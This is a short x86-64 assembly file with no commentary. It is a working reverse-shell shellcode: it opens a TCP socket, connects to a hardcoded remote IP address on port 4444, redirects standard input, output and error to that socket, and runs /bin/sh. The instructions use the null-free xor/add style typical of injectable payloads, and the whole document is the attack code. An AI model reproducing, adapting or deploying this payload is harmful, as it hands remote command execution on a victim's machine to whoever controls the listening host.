global _start


_start:
xor rax,rax
add rax, 41
xor rdi,rdi
mov rdx, rdi
add rdi, 2
xor rsi,rsi
add rsi, 1
syscall

mov rdi, rax

xor rax, rax
push rax
add rax,0x2
mov dword [rsp-4], 0xbefd3267      
mov word [rsp-6], 0x5c11 
mov word [rsp-8], ax
sub rsp, 8
add rax, 40
mov rsi, rsp
xor rdx,rdx
add rdx, 16
syscall
xor rax,rax
mov rsi, rax
add rax, 33
    syscall
    xor rax,rax
    add rax, 33
    xor rsi,rsi
    add rsi, 1
    syscall
    xor rax, rax
    add rax, 33
    xor rsi,rsi
    add rsi, 2
    syscall
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f
    push rbx
    mov rdi, rsp
push rax
    mov rdx, rsp
    push rdi
    mov rsi, rsp
    add rax, 59
    syscall
